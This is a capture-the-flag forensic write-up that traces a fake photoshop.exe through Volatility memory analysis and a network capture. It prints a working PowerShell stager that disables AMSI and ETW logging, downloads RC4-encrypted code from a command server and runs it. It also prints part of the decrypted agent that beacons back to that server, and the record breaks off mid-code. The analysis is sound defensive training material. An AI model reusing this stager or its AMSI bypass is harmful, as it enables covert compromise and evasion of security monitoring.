# Forensic / L'an 1 et puis l'an 2

## Challenge
Sur le réseau de l’entreprise qui vous a mandaté pour investiguer, un employé a lancé un fichier inconnu provenant d’une clé USB. Apeuré, il s’est rendu à la DSI qui a réalisé un dump mémoire de la machine par précaution. Selon-eux il n’y a rien à craindre, la machine n’est pas compromise.

Mais quelques temps après avoir rebranché son PC sur le réseau, l’employé s’est mis à perdre certains de ses fichiers, pris de panique il a éteint sa machine.

Heureusement, la DSI met en place une capture du réseau constante.

Avec ces deux captures, votre objectif est d’aider la DSI à comprendre ce qu’il s’est passé et de retrouver le contenu du précieux fichier !

## Inputs
- Memory dump: cesar.raw
- PCAP file: [capture.pcapng](./capture.pcapng)


## Analysis of the memory dump
Let's first analyse the memory dump using `Volatility`. First we need to identify the most probable `profile` using command `imageinfo`:
```console
 $ python2.7 /opt/volatility/vol.py -f cesar.raw imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win10x64_19041
(...)
```

The probable profile is `Win10x64_19041`. Let's look at the running processes using command `pstree`. The two binaries `DumpIt.exe` and `photoshop.exe` stick out:
```console
$ python2.7 /opt/volatility/vol.py -f cesar.raw --profile=Win10x64_19041 pstree
Volatility Foundation Volatility Framework 2.6.1
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
(...)
... 0xffffe70f7b136080:DumpIt.exe                    3388   3992      3      0 2023-07-08 19:14:11 UTC+0000
.... 0xffffe70f7a2fd080:conhost.exe                  7252   3388      7      0 2023-07-08 19:14:11 UTC+0000
... 0xffffe70f7a526080:vm3dservice.ex                1960   3992      1      0 2023-07-08 19:09:26 UTC+0000
... 0xffffe70f7a9f5080:photoshop.exe                 8112   3992     18      0 2023-07-08 19:13:29 UTC+0000
. 0xffffe70f792bb140:fontdrvhost.ex                   872    616      6      0 2023-07-08 19:09:06 UTC+0000
```

We can also do some more recon with command `cmdline`, and focus and those two binaries:
```console
$ python2.7 /opt/volatility/vol.py -f cesar.raw --profile=Win10x64_19041 cmdline
Volatility Foundation Volatility Framework 2.6.1
(...)
************************************************************************
photoshop.exe pid:   8112
Command line : "C:\Users\cesar\Desktop\photoshop.exe"
************************************************************************
DumpIt.exe pid:   3388
Command line : "C:\Users\cesar\DumpIt.exe"
************************************************************************
(...)
```

Let's focus on `photoshop.exe` first and extract that suspicious binary file:
```console
$ python2.7 /opt/volatility/vol.py -v -f cesar.raw --profile=Win10x64_19041 dumpfiles -n --dump-dir=. -r photoshop.exe
Volatility Foundation Volatility Framework 2.6.1
ImageSectionObject 0xffffe70f7a10a170   8112   \Device\HarddiskVolume2\Users\cesar\Desktop\photoshop.exe
DataSectionObject 0xffffe70f7a10a170   8112   \Device\HarddiskVolume2\Users\cesar\Desktop\photoshop.exe
```

We successfully extracted it. Let's throw `strings` at it:
```console
$ strings file.8112.0xffffe70f7a15fcc0.photoshop.exe.img
(...)
If($PSVersionTable.PSVersion.Major -ge 3){$Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$Ref.GetField('amsiInitFailed','NonPublic,Static').Setvalue($Null,$true);[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0);};[System.Net.ServicePointManager]::Expect100Continue=0;$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADIAOgA4ADAAOAAwAA==')));$t='/admin/get.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('Td:b0uCNi#W}L7!@qFk](^f&.=?3re;G');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","DDCCFsKOAD=Uns/XCBDMk0lmDUO2PfJlWwUEG0=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX
_CorExeMain
mscoree.dll
```

Allright, that `Powershell` code is suspicious indeed.

## Analyse Powershell code from suspicious photoshop.exe
Let's beautify it to easier reading:
```sh
$wc=New-Object System.Net.WebClient;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADIAOgA4ADAAOAAwAA==')));
$t='/admin/get.php';
$wc.Headers.Add('User-Agent',$u);
$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;

$K=[System.Text.Encoding]::ASCII.GetBytes('Td:b0uCNi#W}L7!@qFk](^f&.=?3re;G');

$R={
  $D,$K=$Args;$S=0..255;0..255|%{
    $J=($J+$S[$_]+$K[$_%$K.Count])%256;
    $S[$_],$S[$J]=$S[$J],$S[$_]
  };
  $D|%{
    $I=($I+1)%256;
    $H=($H+$S[$I])%256;
    $S[$I],$S[$H]=$S[$H],$S[$I];
    $_-bxor$S[($S[$I]+$S[$H])%256]
  }
};

$wc.Headers.Add("Cookie","DDCCFsKOAD=Uns/XCBDMk0lmDUO2PfJlWwUEG0=");
$data=$wc.DownloadData($ser+$t);
$iv=$data[0..3];
$data=$data[4..$data.length];
-join[Char[]](& $R $data ($IV+$K))|IEX
```

Let's decode that `base64` there:
```console
$ echo -n aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADIAOgA4ADAAOAAwAA== | base64 -d
http://192.168.0.2:8080
```

Allright, so this code is fetching some data from `http://192.168.0.2:8080/admin/get.php`:
```sh
$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADIAOgA4ADAAOAAwAA==')));
$t='/admin/get.php';
$data=$wc.DownloadData($ser+$t);
```

And next, a `decryption key` is defined and used to decrypt the previously downloaded data. The decryption function is located in function `$R` above:
```sh
$K=[System.Text.Encoding]::ASCII.GetBytes('Td:b0uCNi#W}L7!@qFk](^f&.=?3re;G');
(...)
$iv=$data[0..3];
$data=$data[4..$data.length];
-join[Char[]](& $R $data ($IV+$K))|IEX
```

Let's now move to the PCAP file and see if we were able to capture the download of that data.

## Decrypt data fetched from GET /admin/get.php and logged in the PCAP capture file
We see some `http` traffic in the `PCAP capture` file, involving the same IP address and TCP port: http://192.168.0.2:8080:

![get_admin.png](./get_admin.png)

And the first request to `/admin/get.php` corresponds to what we previously analysed. Of course it is encrypted in the `http response`, but we have the `powershell code` to decrypt it, from the analysis above.

So let's extract the encrypted data from the `PCAP file`, `base64` encode it to make it easier to handle and decrypt it with the code above (extracted from `photoshop.exe`). Implemented in [dec_stager.ps1](./dec_stager.ps1):

```sh
$data_b64='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'

$data=[Convert]::FromBase64String($data_b64)

$K=[System.Text.Encoding]::ASCII.GetBytes('Td:b0uCNi#W}L7!@qFk](^f&.=?3re;G');

$R={
  $D,$K=$Args;$S=0..255;0..255|%{
    $J=($J+$S[$_]+$K[$_%$K.Count])%256;
    $S[$_],$S[$J]=$S[$J],$S[$_]
  };
  $D|%{
    $I=($I+1)%256;
    $H=($H+$S[$I])%256;
    $S[$I],$S[$H]=$S[$H],$S[$I];
    $_-bxor$S[($S[$I]+$S[$H])%256]
  }
};

$iv=$data[0..3];
$data=$data[4..$data.length];

$result=-join[Char[]](& $R $data ($IV+$K))
Write-Output $result
```

We can successfully decrypt the data (fetched from `/admin/get.php`) and get some more `powershell code` !:

```console
$ pwsh -File dec_stager.ps1
$Script:server = "http://192.168.0.2:8080";$Script:ControlServers = @($Script:server);$Script:ServerIndex = 0;if($server.StartsWith('https')){[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};}$Script:SendMessage = {param($Packets)if($Packets) {$EncBytes = Encrypt-Bytes $Packets;$RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {$wc = New-Object System.Net.WebClient;$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;if($Script:Proxy) {$wc.Proxy = $Script:Proxy;}$wc.Headers.Add('User-Agent', $Script:UserAgent);$Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};try {$taskURI = $Script:TaskURIs | Get-Random;$response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);}catch [System.Net.WebException]{if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;}}}}};$Script:GetTask = {try {if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {$RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;$RoutingCookie = [Convert]::ToBase64String($RoutingPacket);$wc = New-Object System.Net.WebClient;$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;if($Script:Proxy) {$wc.Proxy = $Script:Proxy;}$wc.Headers.Add("User-Agent",$script:UserAgent);$script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)};$wc.Headers.Add("Cookie","session=$RoutingCookie");$taskURI = $script:TaskURIs | Get-Random;$result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);$result;}}catch [Net.WebException] {$script:MissedCheckins += 1;if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;}}};function Start-Negotiate {param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',$hop)function ConvertTo-RC4ByteStream {Param ($RCK, $In)begin {[Byte[]] $Str = 0..255;$J = 0;0..255 | ForEach-Object {$J = ($J + $Str[$_] + $RCK[$_ % $RCK.Length]) % 256;$Str[$_], $Str[$J] = $Str[$J], $Str[$_];};$I = $J = 0;}process {ForEach($Byte in $In) {$I = ($I + 1) % 256;$J = ($J + $Str[$I]) % 256;$Str[$I], $Str[$J] = $Str[$J], $Str[$I];$Byte -bxor $Str[($Str[$I] + $Str[$J]) % 256];}}}function 